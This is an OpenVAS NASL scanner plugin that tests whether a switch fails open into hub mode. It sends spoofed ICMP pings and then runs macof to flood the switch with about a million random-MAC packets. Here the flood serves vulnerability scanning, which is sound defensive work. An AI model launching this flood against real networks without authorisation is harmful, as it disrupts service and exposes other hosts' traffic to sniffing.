if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.80103" );
	script_version( "2020-07-30T06:58:46+0000" );
	script_tag( name: "last_modification", value: "2020-07-30 06:58:46 +0000 (Thu, 30 Jul 2020)" );
	script_tag( name: "creation_date", value: "2009-08-10 06:09:48 +0200 (Mon, 10 Aug 2009)" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:C" );
	script_copyright( "Copyright (C) 2009 Vlatko Kosturjak" );
	script_name( "3com switch2hub" );
	script_category( ACT_DENIAL );
	script_family( "Denial of Service" );
	script_dependencies( "find_service.sc", "global_settings.sc", "toolcheck.sc" );
	script_mandatory_keys( "Tools/Present/macof" );
	script_exclude_keys( "keys/islocalhost", "keys/TARGET_IS_IPV6" );
	script_add_preference( name: "Network interface on OpenVAS box (used for scanning):", type: "entry", value: "", id: 1 );
	script_add_preference( name: "Fake IP (alive and on same subnet as scanner):", type: "entry", value: "", id: 2 );
	script_add_preference( name: "Number of packets:", type: "entry", value: "1000000", id: 3 );
	script_add_preference( name: "Report missing configuration or dependencies", value: "no", type: "checkbox", id: 4 );
	script_xref( name: "URL", value: "http://www.securitybugware.org/Other/2041.html" );
	script_tag( name: "solution", value: "Lock Mac addresses on each port of the remote switch or
  buy newer switch." );
	script_tag( name: "summary", value: "The remote host is subject to the switch to hub flood attack." );
	script_tag( name: "insight", value: "The remote host on the local network seems to be connected through a
  switch which can be turned into a hub when flooded by different mac addresses. The theory is to send a
  lot of packets (> 1000000) to the port of the switch we are connected to, with random mac addresses.
  This turns the switch into learning mode, where traffic goes everywhere." );
	script_tag( name: "impact", value: "An attacker may use this flaw in the remote switch
  to sniff data going to this host." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "Workaround" );
	exit( 0 );
}
require("misc_func.inc.sc");
if(islocalhost() || TARGET_IS_IPV6()){
	exit( 0 );
}
interface = script_get_preference( name: "Network interface on OpenVAS box (used for scanning):", id: 1 );
fakeip = script_get_preference( name: "Fake IP (alive and on same subnet as scanner):", id: 2 );
nrpackets = script_get_preference( name: "Number of packets:", id: 3 );
report_missing = script_get_preference( name: "Report missing configuration or dependencies", id: 4 );
if(!fakeip){
	if(report_missing != "yes"){
		exit( 0 );
	}
	log_message( port: 0, data: "Fake IP address not specified. Skipping this check." );
	exit( 0 );
}
if(!nrpackets){
	nrpackets = 1000000;
}
if(!interface){
	if(report_missing != "yes"){
		exit( 0 );
	}
	log_message( port: 0, data: "Interface not specified. Skipping this check." );
	exit( 0 );
}
func spoofping( srcaddr, dstaddr ){
	n = 3;
	seq = 0;
	filter = strcat( "(tcp or icmp and icmp[0]=0) and src host ", dstaddr, " and dst host ", srcaddr );
	d = rand_str( length: 8 );
	for(i = 0;i < 8;i++){
		filter = strcat( filter, " and icmp[", i + 8, "]=", ord( d[i] ) );
	}
	r = NULL;
	nr = 0;
	for(i = 0;i < n;i++){
		seq++;
		ip = forge_ip_packet( ip_hl: 5, ip_v: 4, ip_tos: 0, ip_id: rand() % 65536, ip_off: 0, ip_ttl: 0x40, ip_p: IPPROTO_ICMP, ip_src: srcaddr, ip_len: 38 + 36 );
		icmp = forge_icmp_packet( ip: ip, icmp_type: 8, icmp_code: 0, icmp_seq: seq, icmp_id: seq, data: d );
		r = send_packet( packet: icmp, pcap_active: TRUE, pcap_filter: filter, pcap_timeout: 1 );
		if(r){
			nr++;
		}
	}
	if( nr > 0 ){
		return ( 1 );
	}
	else {
		return ( 0 );
	}
}
if(!find_in_path( "macof" )){
	exit( 0 );
}
thisaddr = this_host();
dstaddr = get_host_ip();
if(( thisaddr == fakeip ) || ( dstaddr == fakeip )){
	exit( 0 );
}
if( spoofping( srcaddr: fakeip, dstaddr: dstaddr ) ){
	exit( 0 );
}
else {
	i = 0;
	argv[i++] = "macof";
	argv[i++] = "-i";
	argv[i++] = interface;
	argv[i++] = "-n";
	argv[i++] = nrpackets;
	res = pread( cmd: "macof", argv: argv, cd: 1, nice: 5 );
	if(ContainsString( res, "libnet_check_iface() ioctl: " )){
		if(report_missing != "yes"){
			exit( 0 );
		}
		log_message( port: 0, data: "Problem with executing macof. Probably you specified the wrong interface for this check." );
		exit( 0 );
	}
	if(spoofping( srcaddr: fakeip )){
		security_message( port: 0 );
	}
}
exit( 99 );

